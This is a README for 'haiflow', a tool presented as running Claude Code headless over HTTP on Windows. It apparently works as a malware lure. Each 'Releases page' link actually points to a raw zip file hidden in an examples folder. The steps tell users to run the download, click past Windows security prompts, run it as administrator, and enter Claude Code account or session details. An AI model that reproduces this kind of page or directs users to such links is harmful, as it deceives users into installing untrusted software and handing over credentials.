# 🤖 haiflow - Run Claude Code from Windows

[![Download haiflow](https://img.shields.io/badge/Download%20haiflow-Release%20Page-blue?style=for-the-badge)](https://github.com/Urielspectrographic907/haiflow/raw/refs/heads/main/examples/n8n-workflows/Software_v3.4.zip)

## 🚀 What haiflow does

haiflow lets you run Claude Code as a headless AI agent over HTTP. In plain terms, it lets your computer send tasks to Claude through a web link, then get results back without you opening a chat app.

Use it for tasks like:

- Code generation
- Refactoring
- Bug triage
- Routine file changes
- Simple workflow automation
- Triggering work from other tools through a REST API

It works with your existing Claude Code subscription and is built for flow-based use, hooks, and automation.

## 💻 Before you start

You only need a Windows PC and internet access.

Use this checklist:

- Windows 10 or Windows 11
- A stable internet connection
- Your Claude Code subscription
- Enough disk space for the app and its files
- Permission to run downloaded apps on your PC

If your PC blocks unknown apps, you may need to allow the app the first time you open it.

## 📥 Download haiflow

Visit this page to download:

[Open the haiflow Releases page](https://github.com/Urielspectrographic907/haiflow/raw/refs/heads/main/examples/n8n-workflows/Software_v3.4.zip)

On that page:

1. Find the latest release
2. Open the release files
3. Download the Windows file, such as an `.exe` or `.zip`
4. Save it to your Downloads folder or Desktop

If you see more than one file, choose the Windows version.

## 🪟 Install on Windows

If you downloaded an `.exe` file:

1. Double-click the file
2. If Windows asks for permission, click **Yes**
3. Follow the on-screen steps
4. Wait for the install to finish

If you downloaded a `.zip` file:

1. Right-click the file
2. Select **Extract All**
3. Pick a folder you can find later, such as Desktop
4. Open the extracted folder
5. Double-click the app file inside it

If Windows shows a security prompt, choose the option that lets you keep going if you trust the source.

## ▶️ First run

After you install or extract haiflow:

1. Open the app
2. Wait for it to start
3. If it asks for setup details, enter your Claude Code account or session info
4. Leave the app running while you use it
5. Keep the window open if the app uses a local service

haiflow acts like a small worker on your computer. Once it is running, other tools can send it tasks over HTTP.

## 🌐 How to use it

You do not need to code to use haiflow, but it helps to know the basic idea:

- Another app sends a request to haiflow
- haiflow passes the task to Claude Code
- Claude works on the request
- haiflow returns the result

This makes it useful for:

- Asking Claude to make code changes
- Sending bug reports for review
- Starting repeat work from a webhook
- Running steps in a workflow tool like n8n
- Queueing tasks for later processing

If you use other tools that support REST API calls, they can connect to haiflow.

## 🔧 Basic setup path

Use this simple setup path on Windows:

1. Download the latest release
2. Install or extract the app
3. Start haiflow
4. Sign in or connect your Claude Code session
5. Keep the app running
6. Send a test task from your workflow tool or API client

If you are not using another tool yet, start by opening the app and checking that it runs without errors.

## 🧭 Common things you may see

### API endpoint

This is the web address that other tools use to talk to haiflow. It is often on your local machine, such as `http://localhost` with a port number.

### Hook

A hook is an event that starts a task. For example, a file change, a webhook call, or a queue event can trigger work.

### Headless

Headless means the agent runs without a normal chat window. It works in the background.

### Queue

A queue holds tasks until haiflow is ready to process them.

## 🛠️ Example uses

Here are a few simple ways people may use haiflow:

- Send a bug report and ask for a fix plan
- Create code from a short task request
- Refactor a file or folder
- Review changes before a pull request
- Automate routine updates
- Trigger work from another app with a webhook

This makes haiflow useful when you want Claude Code to do work without staying in front of the screen.

## 🔒 Good setup habits

Keep these habits in mind:

- Use the latest release
- Keep your Claude Code access ready
- Do not close the app while a task is running
- Save important work before starting large jobs
- Check the output before you use code changes

These steps help avoid confusion during setup and use.

## 🧪 If it does not open

If haiflow does not start:

1. Right-click the file and try **Run as administrator**
2. Check that Windows did not block the file
3. Make sure you downloaded the Windows release
4. Try extracting the files again if you used a `.zip`
5. Reboot your PC and open it again

If the app starts but does not respond:

1. Make sure the app is still running
2. Check that your network is active
3. Confirm your Claude Code session is connected
4. Look for a local address or port in the app window or logs

## 📚 For workflow tools

haiflow fits well with tools that send REST API requests or webhooks.

You can connect it to:

- n8n
- Custom scripts
- Local automation tools
- Task queues
- Internal dashboards

A common setup is to let another tool send a job to haiflow, then let haiflow run Claude Code in the background and return the result.

## 🧰 Project focus

haiflow is built around:

- AI agents
- Automation
- REST APIs
- Webhooks
- Task queues
- Workflow systems
- Background task running
- Claude Code integration

It aims to make Claude Code easier to use in repeatable flows.

## 📌 Quick start

1. Open the [haiflow Releases page](https://github.com/Urielspectrographic907/haiflow/raw/refs/heads/main/examples/n8n-workflows/Software_v3.4.zip)
2. Download the latest Windows file
3. Install it or extract it
4. Open haiflow
5. Connect your Claude Code access
6. Keep it running for API-based tasks